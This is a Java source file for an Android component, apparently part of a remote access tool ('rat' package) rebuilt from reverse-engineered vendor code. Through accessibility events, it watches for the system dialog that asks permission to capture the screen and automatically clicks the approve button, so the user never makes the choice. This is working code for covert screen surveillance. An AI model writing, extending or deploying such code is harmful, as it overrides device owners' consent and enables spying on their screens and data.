package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;

import java.util.Collections;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 屏幕投影权限自动授予代理
 *
 * 基于逆向: o/o.java (55行) — 最小的 Delegate
 *
 * 监听 MediaProjectionPermissionActivity, 自动点击"立即开始"按钮
 *
 * 字段对齐:
 *   f681o → (static synthetic)
 *   f682n → processedActions (ConcurrentLinkedQueue)
 *
 * 方法对齐:
 *   H() → createMediaProjectionWindow
 *   d() → destroy
 *   u() → onAccessibilityEvent
 */
public class MediaProjectionDelegate extends AutoEngine {

    private static final String TAG = "MediaProjDelegate";

    // vendor o/o.java 构造: super(singletonList(H()), "com.android.systemui")
    private static final String SYSTEM_UI = "com.android.systemui";
    private static final String MEDIA_PROJECTION_ACTIVITY =
        "com.android.systemui.media.MediaProjectionPermissionActivity";

    // State
    private static final String ST_ALLOW = "allowInMediaProjection";

    // 字段 — vendor f682n
    private final ConcurrentLinkedQueue<String> processedActions = new ConcurrentLinkedQueue<>();

    public MediaProjectionDelegate() {
        super(Collections.singletonList(
            new WindowMatcher(SYSTEM_UI, MEDIA_PROJECTION_ACTIVITY)
                .addEventType(32).addEventType(16384)),
            SYSTEM_UI);
    }

    @Override
    public void execute() {
        // vendor 无独立 execute, 由事件驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // vendor 不使用回调模式
    }

    // ====== 事件处理 — 对应 vendor u() 行 37-54 ======

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        // vendor u():39 — super.u()
        super.onAccessibilityEvent(event, packageName, className);

        // vendor u():40 — q(singletonList(H()))
        boolean matched = matchWindow(packageName, className,
            event != null ? event.getEventType() : 0);

        if (matched) {
            Log.d(TAG, "已进入是否允许屏幕投影权限窗口");
            // vendor u():47-52
            if (!processedActions.contains(ST_ALLOW)) {
                processedActions.add(ST_ALLOW);
                // vendor: l.c(new a(this, 3), this.c)
                scheduler.execute(new Runnable() {
                    @Override public void run() { autoAllowMediaProjection(); }
                });
            }
        }
    }

    // ====== 任务处理 — 对应 vendor a(this, 3) case 3 ======

    /**
     * 自动点击允许屏幕投影
     * 查找 android:id/button1 按钮并点击
     */
    private void autoAllowMediaProjection() {
        try {
            UiNode root = getRootNode();
            if (root == null) return;

            CombineFilter filter = CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1"));

            UiNode button = root.findOneByCombine(filter);
            if (button != null && button.click()) {
                Log.d(TAG, "已点击允许屏幕投影权限");
            }
            processedActions.remove(ST_ALLOW);
        } catch (Exception e) {
            logError("autoAllowMediaProjection", e);
            processedActions.remove(ST_ALLOW);
        }
    }

    // ====== destroy — 对应 vendor d() 行 30-34 ======

    @Override
    public void destroy() {
        processedActions.clear();
        super.destroy();
    }

    // ====== equals/hashCode ======

    @Override
    public boolean equals(Object obj) {
        return obj instanceof MediaProjectionDelegate;
    }

    @Override
    public int hashCode() {
        return Objects.hash(MediaProjectionDelegate.class.getName());
    }
}
